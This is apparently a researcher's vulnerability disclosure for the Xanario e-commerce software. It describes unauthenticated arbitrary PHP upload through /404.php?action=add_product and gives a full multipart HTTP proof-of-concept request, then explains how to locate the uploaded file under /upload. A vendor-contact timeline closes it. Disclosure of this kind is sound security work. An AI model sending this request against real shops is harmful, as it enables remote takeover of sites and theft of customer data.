# Unauthenticated Remote Code Execution (RCE) via Arbitrary File Upload in Xanario

Xanario presents itself as an e-commerce solution designed to streamline online retail. More information can be found at [xanario.de](https://xanario.de).  

Interestingly, purchasing their software requires customers to share their FTP credentials and admin password through a PDF form—an approach that speaks volumes about their understanding of security best practices.

The vulnerability at hand allows unauthenticated attackers to upload arbitrary PHP files through a seemingly innocuous endpoint: `/404.php?action=add_product`. This file upload does not require any authentication and leads directly to remote code execution.


```http
POST /404.php?action=add_product HTTP/2
Host: localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymHYufpymkCWywEX5
Content-Length: 488

------WebKitFormBoundarymHYufpymkCWywEX5
Content-Disposition: form-data; name="number_of_uploads"

1
------WebKitFormBoundarymHYufpymkCWywEX5
Content-Disposition: form-data; name="products_id"

1
------WebKitFormBoundarymHYufpymkCWywEX5
Content-Disposition: form-data; name="upload_1"

bar
------WebKitFormBoundarymHYufpymkCWywEX5
Content-Disposition: form-data; name="id[txt_bar]"; filename="asdf.php"
Content-Type: image/png

<?php evilstuff..;?>
------WebKitFormBoundarymHYufpymkCWywEX5--
```

The uploaded file will be available at `/upload` with a stripped down md5 based on *microtime*. e.g:
```bash
> ls upload
b889c2a25_asdf.php
```

This disclosure marks the first installment in a series of identified vulnerabilities affecting Xanario. Users and administrators are strongly encouraged to evaluate safer alternatives and reconsider their reliance on this software.

Stay tuned for more insights as we continue to explore Xanario’s security landscape.

---

## Timeline
* December 24, 2024: Initial vulnerability report sent to the vendor. No response received.
* February 12, 2025: Follow-up notification sent. Still no reply.

